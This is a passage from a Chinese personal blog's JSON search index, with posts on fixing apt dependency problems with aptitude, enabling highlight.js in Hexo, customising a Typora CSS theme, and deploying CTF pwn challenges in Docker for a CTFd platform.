hold</code>指令查找held的软件包，并没有任何结果。</p>\n<p>​    经过各种试错，找到了一个快速解决的方法。</p>\n<pre><code class=\"bash\">sudo aptitude install gcc-multilib\n</code></pre>\n<p><code> aptitude</code>与apt类似，也是包管理器。但是通过<code>aptitude</code>进行包管理，对于软件包依赖问题的处理更加细节。</p>\n<p>​    下面是一些常用的命令</p>\n<pre><code class=\"bash\">aptitude update #更新可用的包列表\naptitude purge &lt;pkgname&gt; #删除包及其配置文件\naptitude search &lt;pkgname&gt; #搜索包\naptitude clean #删除下载的包文件\naptitude autoclean #删除过期的包文件\n</code></pre>\n<p><code> aptitude</code>执行起来和<code>apt</code>其实不太一样，比如    <code>sudo aptitude install gcc-multilib </code>这个命令其实执行起来长这样：</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%8810.58.52.png\" data-caption=\"截屏2021-10-27 下午10.58.52\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%8810.58.52.png\" alt=\"截屏2021-10-27 下午10.58.52\"></a></p>\n<p>​    然后<code>aptitude</code>会问你</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%8811.00.00.png\" data-caption=\"截屏2021-10-27 下午11.00.00\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%8811.00.00.png\" alt=\"截屏2021-10-27 下午11.00.00\"></a></p>\n<p>​    这里是最大的坑。如果是像我这种不想看英文按照习惯输Y的人，这里会踩一个大坑。</p>\n<p>​    明确地告诉了我：</p>\n<pre><code class=\"bash\">The following actions will resolve these dependencies:\n\n      Keep the following packages at their current version:\n      ...\n      ...\n      ...\n      Accept this solution? [Y/n/q/?] \n\n</code></pre>\n<p>保持下面软件包的版本不变，你接受这个解决方式吗？</p>\n<p>显然我不接受，只要摁下N，问题就解决了。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%8811.00.00.png\" data-caption=\"\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%8811.00.00.png\" alt=\"\"></a></p>\n<p>然后。自动执行gdb-multilib的安装。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/image-20211027230403989.png\" data-caption=\"image-20211027230403989\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/image-20211027230403989.png\" alt=\"image-20211027230403989\"></a></p>\n<p>问题解决。</p>\n<h3 id=\"3）总结\">3）总结<a class=\"post-anchor\" href=\"#3）总结\"></a></h3><p>​    这个问题回过头来想，其实非常简单，如果清楚问题所在的话，只需要一行命令就能解决。当然并不是每个人都经验丰富，但是没有经验，可以积累经验，然而在积累的过程中，有些愚蠢的错误确实是不应该犯的。比如说，不认真看报错信息，或者提示，凭着感觉装。这是我在处理这种问题上最大的弱点。</p>\n<p>​    一个原因是我骄傲自满了，我确实认为在这一步不会出错，但是实际上问题就是发生在这一步上，另外就是，全英文的屏显，没有人愿意仔细阅读，但是这点没有办法，绝对不可能调成中文，这里只能是说，慢慢看，仔细看 ，然后提升一下英语水平。（但是有一说一，英语母语的人可能都不愿意看吧）</p>\n<h3 id=\"4）参考\">4）参考<a class=\"post-anchor\" href=\"#4）参考\"></a></h3><p><a href=\"https://blog.csdn.net/White_Idiot/article/details/58348957\">【Ubuntu】aptitude命令详解</a></p>\n<p><a href=\"https://askubuntu.com/questions/223237/unable-to-correct-problems-you-have-held-broken-packages\">Unable to correct problems, you have held broken packages</a></p>\n</body></html>","tags":["linux primary"]},{"title":"解决hexo无法显示高亮问题","url":"/2021/10/28/%E8%A7%A3%E5%86%B3hexo%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA%E9%AB%98%E4%BA%AE%E9%97%AE%E9%A2%98/","content":"<html><head></head><body><p>​    博客搭了有快一年了，一直是hexo+git page的配置（不过这个搭配现在绝版了2333），但是一直荒废着，差不多到大一暑假的时候才想起要好好经营。</p>\n<p>​    但是代码高亮这个一直没有解决。</p>\n<p>​    之前我以为是博客主题配置的问题（就是highlight对象的值的问题），但是无论用怎么样的方法都不太行。</p>\n<p>​    在研究代码高亮的过程中，我才知道原来有个项目叫highlight.js,里面有各种各样的代码高亮的css文件。</p>\n<p>​    一开始我是将博客原本的代码高亮的css文件替换成我想要的样式，但是无论替换成什么样式，博客中代码都是蓝色，清一色的蓝色。然后我意识到，这根本不是什么代码高亮的样式，这根本就是，没有代码高亮。</p>\n<p>​    然后我开始在网上寻找解决方案，搜索的关键词是hexo 无法显示代码高亮，辗转来回，找到了一篇文章。</p>\n<p>​    <a href=\"https://igeek.cloud/2021/01/13/hexo%E4%B8%ADhighlight-js%E4%BB%A3%E7%A0%81%E9%AB%98%E4%BA%AE%E7%9A%84%E4%BF%AE%E6%94%B9%E6%96%B9%E6%B3%95/\">hexo中highlight.js代码高亮的修改方法</a></p>\n<p>​    按照文章中的方法，我在主题layout文件夹中的_post.ejs文件随便找了个角落，把</p>\n<pre><code class=\"html\">COPY&lt;!-- Highlight.js --&gt;\n&lt;link rel=\"stylesheet\"\n        href=\"//highlightjs.org/static/demo/styles/night-owl.css\"&gt;\n&lt;script src=\"//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js\"&gt;\n&lt;/script&gt;\n&lt;script&gt;\n    hljs.initHighlightingOnLoad();\n&lt;/script\n</code></pre>\n<p>丢了进去。</p>\n<p>​    然后我的博客就成功的显示了代码高亮。</p>\n<p>​    这样看其实看不出什么端倪，具体功能的实现还是要看脚本的内容，但是估计我也看不懂（）。</p>\n<p>​    </p>\n</body></html>","tags":["mess"]},{"title":"typora主题配置的一些心得","url":"/2021/10/29/typora%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BF%83%E5%BE%97/","content":"<html><head></head><body><h4 id=\"1）\">1）<a class=\"post-anchor\" href=\"#1）\"></a></h4><p>​    由于看腻了typora原主题的python高亮的丑兮兮的屎黄色注释，决定换个主题。然而找遍整个主题列表，并没有我看得上的主题。本来打算作罢，但想起最近因为写小程序，学了一些简单的css，是不是可以尝试一下修改某些主题的css文件，打造一个自己喜欢的主题捏。</p>\n<h4 id=\"2）\">2）<a class=\"post-anchor\" href=\"#2）\"></a></h4><p>​    在下载主题的过程中我大致了解了一下typora主题开发的大致内容，其实主体感觉就是css（除了css，就是各种需要的字体。</p>\n<p>​    这里以主题<code>mint</code>为例，css中<code>:root</code>元素声明了全局css变量，如下：</p>\n<pre><code class=\"css\"> :root {\n  --side-bar-bg-color: #ffffff;//边栏颜色\n    --control-text-color: #6B6B6B;//边栏文件未选中字体颜色\n    --active-file-bg-color: #ecf6f2;//边栏文件背景颜色\n    --active-file-border-color: #6B6B6B;//不清楚是个啥\n    --active-file-text-color: #202020;//边栏文件选中后字体颜色\n    --table-even-row-color:#f8fcfa;//不清楚是个啥\n    --table-head-color:#d9ede5;//不清楚是个啥\n    --deep-theme-color: #c2e2d5;//深色模式主题色\n    --code-block-bg-color: #0F111A;//代码块字体颜色以及代码块边框颜色\n    \n}\n</code></pre>\n<p>​    所以如果想修改各种配色，只需要修改对应颜色的hex就行。</p>\n<p>​    这个比较难搞的是猜测各种元素对应的含义（（需要手动去尝试。但是就算是这样还是有几个元素没有试出来到底是哪一块的配色，似乎typora也没有类似的官方文档来规定每个div的名字（（</p>\n<p>​    然后需要修改的是代码高亮的一些相关配色，typora的代码高亮是直接用的css而不是引用<code>highlight.js</code>（感觉也差不多233）。</p>\n<p>​    然后我们找到代码高亮的css元素（其他的基本都是字体以及留白的一些样式，没有需求可以不用管）,找到对应的元素就可以开始魔改（</p>\n<p>​    (ps:感觉typora还有很多主题的方法可以使用，比如说backgroud = url（），通过这个 插入图片等，但是好像并没有找到类似的文档，我也不想再切图，于是作罢)</p>\n<p>​    其实魔改以后感觉变化也不是特别大，但是魔改的过程还是很有意思。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-30%20%E4%B8%8B%E5%8D%882.46.50.png\" data-caption=\"截屏2021-10-30 下午2.46.50\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-30%20%E4%B8%8B%E5%8D%882.46.50.png\" alt=\"截屏2021-10-30 下午2.46.50\"></a></p>\n<p>​        顺便附上它的css</p>\n<pre><code class=\"css\"> :root {\n    --side-bar-bg-color: #ffffff;\n    --control-text-color: #424242;\n    --active-file-bg-color: #ffffff;\n    --active-file-border-color: #6B6B6B;\n    --active-file-text-color: #7eadad;\n    --table-even-row-color:#555555;\n    --table-head-color:#7a7979;\n    --deep-theme-color: #343a41;\n    --code-block-bg-color: #292424;\n    \n}\n\n/*serif*/\n@font-face {\n    font-family: 'Lexend';\n    font-weight: normal;\n    font-style: normal;\n    src: url('./mint/Lexend-Regular.ttf') \n}\n\n@font-face {\n    font-family: 'Lexend';\n    font-weight: bold;\n    font-style: normal;\n    src: url('./mint/Lexend-Bold.ttf') \n}\n\n/*monospace*/\n@font-face {\n    font-family: 'SourceCodePro';\n    font-weight: normal;\n    font-style: normal;\n    src: local(SourceCodePro), url('./mint/SourceCodePro-Regular.ttf')\n}\n\n/*Chinese*/\n@font-face {\n    font-family: 'NotoSansSC';\n    font-weight: normal;\n    font-style: normal;\n    src: url('./mint/NotoSansSC-Regular.otf')\n}\n\n@font-face {\n    font-family: 'NotoSansSC';\n    font-weight: bold;\n    font-style: normal;\n    src: url('./mint/NotoSansSC-Bold.otf')\n}\n\nhtml{\n    font-size: 16px;\n}\n\nbody {\n    font-family: 'Lexend','SourceCodePro','NotoSansSC';\n    font-weight: normal;\n    line-height: 1.5rem;\n    letter-spacing: 0;\n    margin: 0;\n}\n\n#write {\n    max-width: 900px;\n    padding: 30px 50px 20px;\n}\n\n#write p{\n    text-align:left;\n}\n\n#write pre.md-meta-block {\n    padding: 1rem;\n    font-size: 85%;\n    line-height: 1.45;\n    background-color: #ffffff;\n    border: 0;\n    border-radius: 3px;\n    color: #141414;\n    margin-top: 0 !important;\n}\n\n.md-image&gt;.md-meta {\n    color: #141414;\n    font-size: 0.9rem;\n    font-family: 'Lexend';\n    padding: 4px 0;\n}\n\n\n@media print {\n  html,body {\n    font-size: 14px;\n  }\n\n  table,\n  pre {\n    page-break-inside: avoid;\n  }\n\n  pre {\n    word-wrap: break-word;\n  }\n  \n}\n@page {\n  size: A4; \n  margin: 8mm 0mm;\n}\n\n/*toc*/\n.md-toc { \n    margin-top:20px;\n    padding-bottom:20px;\n    color: var(--deep-theme-color);\n}\n\na {\n    color: var(--deep-theme-color);\n    text-decoration: none;\n}\n\na:hover {\n    text-decoration: underline;\n}\n\n/*headers*/\nh1,h2,h3,h4,h5,h6 {\n    display: block;\n    font-weight:bold;\n}\n\nh1 {\n    font-size: 2em;\n    margin-top: 0.67em;\n    margin-bottom: 0.67em;\n}\n\nh2 {\n    font-size: 1.5em;\n    margin-top: 0.83em;\n    margin-bottom: 0.83em;\n}\n\nh3 {\n    font-size: 1.17em;\n    margin-top: 1em;\n    margin-bottom: 1em;\n}\n\nh4 {\n    font-size: 1em;\n    margin-top: 1.33em;\n    margin-bottom: 1.33em;\n}\n\nh5 {\n    font-size: 1em;\n    margin-top: 1.33em;\n    margin-bottom: 1.33em;\n    color: #777777;\n}\n\nh6 {\n    font-size: 1em;\n    margin-top: 1.33em;\n    margin-bottom: 1.33em;\n    color: #adadad;\n}\n\np,\nblockquote,\nul,\nol,\ndl,\ntable {\n    margin: 0.8rem 0;\n}\n\n/*table*/\ntable {\n    border-collapse: collapse;\n    padding: 0;\n    word-break: initial;\n    table-layout: fixed;\n    width: 100%;\n}\n\ntable tr:nth-child(even){\n    background-color: var(--table-even-row-color);\n}\n\nthead{\n    background-color: var(--table-head-color);\n}\n\ntable th{\n    text-align: center;\n    padding:6px 13px;\n    border: 1px solid var(--table-head-color);\n}\n\ntable td{\n    padding:6px 13px;\n    border: 1px solid var(--table-head-color);\n}\ntable tr{\n    padding:6px 13px;\n    border: 1px solid var(--table-head-color);\n}\n\n/*blockquote*/\nblockquote {\n    border-left: 0.2rem solid var(--side-bar-bg-color);\n    color: #b4d8e9;\n    font-family: 'Lexend','NotoSansSC';\n    font-size: 0.9rem;\n    padding-left: 2rem;\n}\n\n\n/*list*/\n\nli p.first {\n    display: inline-block;\n}\nul,\nol {\n    padding-left: 30px;\n}\nul:first-child,\nol:first-child {\n    margin-top: 0;\n}\nul:last-child,\nol:last-child {\n    margin-bottom: 0;\n}\n\n.md-task-list-item:hover &gt; input:before,\ninput[type='checkbox']:hover:before {\n    opacity: 1;\n    transition: 0.5s;\n    background-color: var(--side-bar-bg-color);\n}\n\n.task-list-item input::before {\n    content: \"\";\n    display: inline-block;\n    border-radius: 1.1rem;\n    vertical-align: middle;\n    border: 1.2px solid var(--deep-theme-color);\n    background-color: #ffffff;\n    width: 1.1rem;\n    height: 1.1rem;\n    margin-left: -0.1rem;\n    margin-right: 0.1rem;\n    margin-top: -0.68rem; \n}\n\n\n.task-list-item input:checked::before {\n    padding-left: 0.125em;\n    content: '✔';\n    color:white;\n    background-color: var(--deep-theme-color);\n    font-size: 0.8rem;\n    line-height: 0.95rem;\n    margin-top: -0.68rem;\n    transition: background-color 200ms ease-in-out;\n}\n\n\n\n.task-list-done {\n    text-decoration: line-through;\n    color: #343a41;\n}\n\nhr {\n    border-style: none;\n    border-top-style: solid;\n    border-color: #e7e7e7;\n    border-width: 1px;\n    margin: 2rem 0;\n}\n\n\n/*highlight*/\n#write mark {\n    background-color: #c7ffe8;\n    border-radius: 2px;\n    color: rgb(44, 39, 39);\n    padding: 0 4px;\n    margin: 0 2px;\n}\n\n/*inline code*/\n#write code,tt {\n    padding: 0.6px 4px;\n    border-radius: 2px;\n    background-color: rgba(238, 238, 238, 0.39);\n    font-family: 'SourceCodePro',Consolas,Courier, Monospace;\n    font-size: 0.9rem;\n    color: #666666;\n    margin: 0 2px;\n}\n\n/*footnote*/\n#write .md-footnote {\n    color: #343a41;\n    background-color: #e4e4e4;\n}\n\n/*source code mode*/\n.cm-s-typora-default .cm-header {\n    color: #524a4a;\n}\n.cm-s-typora-default .cm-link {\n    color:var(--deep-theme-color);\n\n}\n\n\n/*code block*/\n#write .md-fences {\n    font-size: 1rem;\n    margin: 0.2em 0;\n    padding: 0.5em;\n    border-radius: 3px;\n    font-size: 0.9em;\n    font-family: 'SourceCodePro',Consolas,Courier, Monospace ;\n    background-color: #fffdfd;\n    color: #a3a3a3;\n    border: none;\n    text-shadow: none;\n}\n\n.md-fences .code-tooltip {\n    background-color: #ffffff;\n}\n\n/*\n  Name:       material-ocean\n  Author:     Mattia Astorino (http://github.com/equinusocio)\n  Website:    https://material-theme.site/\n*/\n\n.cm-s-inner.CodeMirror {\n  background-color: #ffffff;\n  color: #343a41;\n}\n\n/*.cm-s-inner .CodeMirror-gutters {\n  background: #ffffff;\n  color: #ffffff;\n  border: none;\n}\n*/\n.cm-s-inner .CodeMirror-linenumber {color: #343a41;}\n.cm-s-inner .CodeMirror-guttermarker { color: #FFEE80; }\n.cm-s-inner .CodeMirror-guttermarker-subtle { color: #D0D0D0; }\n\n/*\n.cm-s-inner .CodeMirror-cursor {\n  border-left: 1px solid #FFCC00;\n}\n.cm-s-inner.cm-fat-cursor .CodeMirror-cursor {\n  background-color: #FFCC00 !important;\n}\n.cm-s-inner .cm-animate-fat-cursor {\n  background-color: #FFCC00 !important;\n}\n*/\n\n.cm-s-inner .CodeMirror-cursor { border-left: 1px solid #A9B7C6; }\n.cm-s-inner div.CodeMirror-cursor { border-left: 1px solid #ffffff; }\n.cm-s-inner div.CodeMirror-selected {\n  background: rgba(58, 58, 59, 0.2);\n}\n\n.cm-s-inner.CodeMirror-focused div.CodeMirror-selected {\n  background: rgba(221, 224, 241, 0.2);\n}\n\n.cm-s-inner .CodeMirror-selected{ background: #d6dce7 !important; }\n.cm-s-inner .CodeMirror-selectedtext { background: #dbdee6 !important; }\n.cm-overlay.CodeMirror-selectedtext { background: #B5D6FC !important; }\n\n.cm-s-inner .CodeMirror-line::selection,\n.cm-s-inner .CodeMirror-line&gt;span::selection,\n.cm-s-inner .CodeMirror-line&gt;span&gt;span::selection {\n  background: rgba(221, 224, 241, 0.2);\n}\n\n.cm-s-inner .CodeMirror-line::-moz-selection,\n.cm-s-inner .CodeMirror-line&gt;span::-moz-selection,\n.cm-s-inner .CodeMirror-line&gt;span&gt;span::-moz-selection {\n  background: rgba(221, 224, 241, 0.2);\n}\n\n.cm-s-inner .CodeMirror-activeline-background {\n  background: #ffffff;\n}\n\n.cm-s-inner .cm-keyword {\n  color: #8979c0;\n}\n\n.cm-s-inner .cm-operator {\n  color: #25c494;\n}\n\n.cm-s-inner .cm-variable-2 {\n  color: #4f5481;\n}\n\n.cm-s-inner .cm-variable-3,\n.cm-s-inner .cm-type {\n  color: #f84f57;\n}\n\n.cm-s-inner .cm-builtin {\n  color: #eca622;\n}\n\n.cm-s-inner .cm-atom {\n  color: #F78C6C;\n}\n\n.cm-s-inner .cm-number {\n  color: #ad7a83;\n}\n\n.cm-s-inner .cm-def {\n  color: #82AAFF;\n}\n\n.cm-s-inner .cm-string {\n  color: #70be26;\n}\n\n.cm-s-inner .cm-string-2 {\n  color: #7a232e;\n}\n\n.cm-s-inner .cm-comment {\n  color: #3a4677;\n}\n\n.cm-s-inner .cm-variable {\n  color: #bb584b;\n}\n\n.cm-s-inner .cm-tag {\n  color: #b44457;\n}\n\n.cm-s-inner .cm-meta {\n  color: #b9b717;\n}\n\n.cm-s-inner .cm-attribute {\n  color: #71498a;\n}\n\n.cm-s-inner .cm-property {\n  color: #a075be;\n}\n\n.cm-s-inner .cm-qualifier {\n  color: #f8ce11;\n}\n\n.cm-s-inner .cm-variable-3,\n.cm-s-inner .cm-type {\n  color: #fce470;\n}\n\n\n.cm-s-inner .cm-error {\n  color: rgba(255, 255, 255, 1.0);\n  background-color: #FF5370;\n}\n\n.cm-s-inner .CodeMirror-matchingbracket {\n  text-decoration: underline;\n  color: white !important;\n}\n\n\n</code></pre>\n</body></html>","tags":["mess"]},{"title":"基于ctf pwn环境的docker搭建","url":"/2021/10/31/%E5%9F%BA%E4%BA%8Ectf%20pwn%E7%8E%AF%E5%A2%83%E7%9A%84docker%E9%85%8D%E7%BD%AE/","content":"<html><head></head><body><p>​    最近为了校内的萌新赛，需要出一些简单的pwn题，然后把它们搓进docker。虽然步骤并不是非常复杂，而且有现成的框架，但我发现如果纯粹按照网上框架的一件脚本运行的话，遇到报错根本无法解决，所以看图说话之外我还需要较为系统地学习docker知识。</p>\n<h2 id=\"docker基础架构\">docker基础架构<a class=\"post-anchor\" href=\"#docker基础架构\"></a></h2><p>​    对于docker，在了解基础命令之前我们需要了解的就是，容器以及虚拟化的大致概念。</p>\n<h3 id=\"1-1-为什么要有docker？\">1.1    为什么要有docker？<a class=\"post-anchor\" href=\"#1-1-为什么要有docker？\"></a></h3><p>​    一个程序运行也许需要严苛的环境条件，也许一个微小的环境变量的差异，将导致程序的崩溃，因此在软件开发的过程中，统一环境是一件很重要的事。</p>\n<p>​    为了解决这个问题，我们可以使用虚拟机，将程序同操作系统一起打包，这样确实避免了因为环境问题导致的程序的bug。</p>\n<p>​    但是虚拟机通常体积庞大，且启动时间缓慢，资源占用多。所以相比于纯粹使用虚拟机，我们希望使用一些更轻盈的虚拟化工具来解决问题。而容器化技术应运而生，也就是Linux 容器（Linux Containers）。</p>\n<p>​    linux容器并不是完整的操作系统，容器化对进程隔离，使得不同的容器共享内核，但是调用的各种资源是虚拟的。容器化就像在正常的进程外伪装了一层外壳，使得壳内的进程认为自己是在一个全新的环境中运行，所以很自然的，容器中的应用启动速度快，资源占用少，并且体积轻巧。</p>\n<p>​    而Docker的存在为我们提供了Linux容器的封装,提供简单易用的容器使用接口。它是目前最流行的 Linux 容器解决方案。</p>\n<h3 id=\"1-2-docker基础知识\">1.2 docker基础知识<a class=\"post-anchor\" href=\"#1-2-docker基础知识\"></a></h3><p>​    之前说到，Docker提供了Linux容器的封装，运用Docker实现容器化也十分简单，我们只需要有image文件，再通过docker创建镜像的容器，就能够在容器中运行我们想要的程序。</p>\n<p>​    image文件，顾名思义，类似系统iso，它包含应用程序以及运行它所必需的依赖，Docker通过image文件生成一个个运行的容器。实际开发中，一个 image 文件往往通过继承另一个 image 文件，加上一些个性化设置而生成。举例来说，你可以在 Ubuntu 的 image 基础上，往里面加入 Apache 服务器，形成你的 image。</p>\n<h3 id=\"1-3-docker基础命令\">1.3 docker基础命令<a class=\"post-anchor\" href=\"#1-3-docker基础命令\"></a></h3><p>​    首先我们需要拉取镜像至本地，可以通过<code>docker pull</code>命令。例如：</p>\n<blockquote>\n<pre><code class=\"bash\">$ docker image pull library/hello-world\n</code></pre>\n</blockquote>\n<p>​    </p>\n<p>​        拉取镜像需要一定时间的等待，拉取完成后，通过<code>docker image ls</code>可以查看本地的docker镜像。</p>\n<p>​    <a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%8811.54.51.png\" data-caption=\"截屏2021-11-01 下午11.54.51\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%8811.54.51.png\" alt=\"截屏2021-11-01 下午11.54.51\"></a></p>\n<p>​    这个<code>hello world</code>其实就是被打包好的在特定环境下的程序，我们可以通过<code>docker cantainer run hello-world</code>指令将镜像创建为容器并运行。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%8811.59.12.png\" data-caption=\"截屏2021-11-01 下午11.59.12\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%8811.59.12.png\" alt=\"截屏2021-11-01 下午11.59.12\"></a></p>\n<h4 id=\"docker-build\">docker build<a class=\"post-anchor\" href=\"#docker-build\"></a></h4><p>​    build指令使用dockerfile来创建新的容器。一般来说简单的构建命令就是</p>\n<pre><code class=\"bash\">$ docker build -t imagename .\n</code></pre>\n<p>​    虽然我不是很理解这个<code>-t</code>    的参数意义何在，并且镜像名后面的“.”是干啥的。</p>\n<h4 id=\"docker-run\">docker run<a class=\"post-anchor\" href=\"#docker-run\"></a></h4><p>​    创建一个新的容器并运行</p>\n<p>​    一般来说会有这几个参数</p>\n<pre><code class=\"bash\">-d: 后台运行容器，并返回容器ID；\n\n-it: 以交互模式运行容器，并创建一个伪终端；\n\n-p: 指定端口映射，格式为：主机(宿主)端口:容器端口\n\n--name=\"nginx-lb\": 为容器指定一个名称；\n\n-v：映射主机文件夹至容器内    \n</code></pre>\n<h4 id=\"docker-start-stop-retart\">docker start/stop/retart<a class=\"post-anchor\" href=\"#docker-start-stop-retart\"></a></h4><p>​    启动或停止容器。</p>\n<p>​    指令为<code>docker start/stop/retart containerID</code></p>\n<h4 id=\"docker-pause\">docker pause<a class=\"post-anchor\" href=\"#docker-pause\"></a></h4><p>​    暂停容器内全部进程。</p>\n<h4 id=\"docker-kill\">docker kill<a class=\"post-anchor\" href=\"#docker-kill\"></a></h4><p>​    kill 运行的容器进程</p>\n<h4 id=\"docker-ps\">docker ps<a class=\"post-anchor\" href=\"#docker-ps\"></a></h4><p>​    列出容器。</p>\n<pre><code class=\"bash\">-a :显示所有的容器，包括未运行的。\n</code></pre>\n<h4 id=\"docker-attach\">docker attach<a class=\"post-anchor\" href=\"#docker-attach\"></a></h4><p>​    连接到正在运行中的容器。</p>\n<p><code>docker attach containerID</code></p>\n<h4 id=\"docker-inspect\">docker inspect<a class=\"post-anchor\" href=\"#docker-inspect\"></a></h4><p>​    获取容器/镜像的元数据。</p>\n<h2 id=\"简单的docker搭建步骤\">简单的docker搭建步骤<a class=\"post-anchor\" href=\"#简单的docker搭建步骤\"></a></h2><p>​    熟悉docker基础操作后，开始搭建docker啦！！</p>\n<p>​    首先是脚本的选择，pwn的docker脚本其实很多，这里随便选一个最基础的<code>ctf_xinted</code>。</p>\n<p>​    首先我们需要做的是把项目clone到本地。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%885.11.41.png\" data-caption=\"截屏2021-11-01 下午5.11.41\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-01%20%E4%B8%8B%E5%8D%885.11.41.png\" alt=\"截屏2021-11-01 下午5.11.41\"></a></p>\n<p>​    通过指令<code>cat Dockerfile</code>可以看到dockerfile。</p>\n<p>​    dockerfile是用来构建docker镜像的，里面包含了构建docker镜像构建的一些步骤和说明。一般来说如果要打包自己的环境的话，需要写dockerfile来供别人使用。这里我们直接切换到<code>ctf_xinetd</code>的文件夹下，然后执行     </p>\n<pre><code class=\"bash\">sudo docker build -t \"helloworld\" .\n</code></pre>\n<p>​    (注意后面的“.”)</p>\n<p>​    这个时候一般就会创建<code>helloworld</code>这个镜像，我们只需要等待创建结束，然后执行</p>\n<pre><code class=\"bash\">sudo docker run -d -p \"0.0.0.0:10001:9999\" -h \"helloworld\" --name=\"helloworld\" helloworld\n</code></pre>\n<p>​    <code>0.0.0.0</code>表示用户连接的ip地址，10001表示对用户开放的端口，9999指容器内部端口绑定到指定的主机端口。</p>\n<p>​    如果运行正常，此时我们是能够通过 <code>nc 0.0.0.0 10001</code>来连接我们的docker容器的。</p>\n<p>​    但是有时候docker会出现一些问题。比如说在创建镜像的时候有可能会出现软件源解释失败的问题，这时候你需要关闭你的vpn（如果有）。然后重启docker。就像这样</p>\n<pre><code class=\"bash\">sudo service docker restart\n</code></pre>\n<p>​    这样这个pwn题的docker就算部署完成了，你只需要把你自己的题目放置在容器中，并修改对应的flag就行。</p>\n<p>​    但是目前来说这个框架存在一些局限性，比如说一次只能部署一道题等。</p>\n<p>​    所以我们可以更换另外一个脚本进行docker镜像的创建。</p>\n<p>​    这里我们选择<a href=\"https://github.com/giantbranch/pwn_deploy_chroot.git%EF%BC%8C%E8%BF%99%E4%B8%AA%E8%84%9A%E6%9C%AC%E3%80%82\">https://github.com/giantbranch/pwn_deploy_chroot.git，这个脚本。</a></p>\n<p>​    然后有个比较全面的教程，链接在这里：<a href=\"http://www.giantbranch.cn/2018/09/24/%E5%A6%82%E4%BD%95%E5%AE%89%E5%85%A8%E5%BF%AB%E9%80%9F%E5%9C%B0%E9%83%A8%E7%BD%B2%E5%A4%9A%E9%81%93ctf%20pwn%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE/\">如何安全快速地部署多道ctf%20pwn比赛题目</a></p>\n<p>​    就是把文件放到bin文件夹，然后</p>\n<pre><code class=\"bash\">python initialize.py\ndocker-compose up --build -d     # please run as root\n</code></pre>\n<p>​    这样就生成了一个总的镜像，每道题通过不同端口映射，然后分别有各自的flag。</p>\n<p>​    在完成镜像的创建后，还需要在做题平台中填写相关镜像。</p>\n<p>​    因为我们的CTFd是二次开发的，一般的CTFd的题目分类是有个dynamic docker，但是我们的平台只有一个kube类型。但是里面的东西还是八九不离十，然后对于指定题目，你需要填写你的docker image。并且指定暴露端口。</p>\n<p>​    然后我这个萌新就被狠狠地坑了，一开始费了好大劲从0学习docker（虽然不难），然后通过别人的框架部署题目，创建好镜像，照猫画虎指定ip和端口运行容器，最后打开CTFd，就直接把docker image那一空给填成自己启动容器的那串ip了，然后端口也傻傻地不知道怎么搞，然后随便乱输一通，结果狠狠地靶机notready了。</p>\n<p>​    直到下午我突然意识到哪里不对，然后去搜了一下，发现别人填的和我填的好像不太一样，找胖爷爷确认了一下，果然是要填docker hub里的镜像名哇。</p>\n<p>​    然后又狠狠地push了镜像，在CTFd填了镜像的名字，然后端口就是初始化时每个二进制文件对应的那个映射的端口，这下总算靶机ready了。并且顺利通过测试。</p>\n<p>​    好！</p>\n<p>​    </p>\n<p>​        </p>\n<p>​        </p>\n<h2 id=\"参考\">参考<a class=\"post-anchor\" href=\"#参考\"></a></h2><p><a href=\"https://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html\">Docker 入门教程</a></p>\n<p><a href=\"https://www.runoob.com/docker/docker-image-usage.html\">Docker 镜像使用</a></p>\n<p>​    </p>\n<p>​    </p>\n</body></html>","tags":["mess"]},{"title":"pwntools(1)-- pwnlib.tube","url":"/2021/10/27/pwntools%EF%BC%881%EF%BC%89--pwnlib.tube/","content":"<html><head></head><body><h3 id=\"0-preview\">0)preview<a class=\"post-anchor\" href=\"#0-preview\"></a></h3><p>​    一般通过萌新一般在接触pwn的时候，一个必不可少的步骤就是下载pwntools，并且在自己人生第一个脚本上输入：</p>\n<pre><code class=\"python\">from pwn import*\n</code></pre>\n<p>​    我也如此。</p>\n<p>​    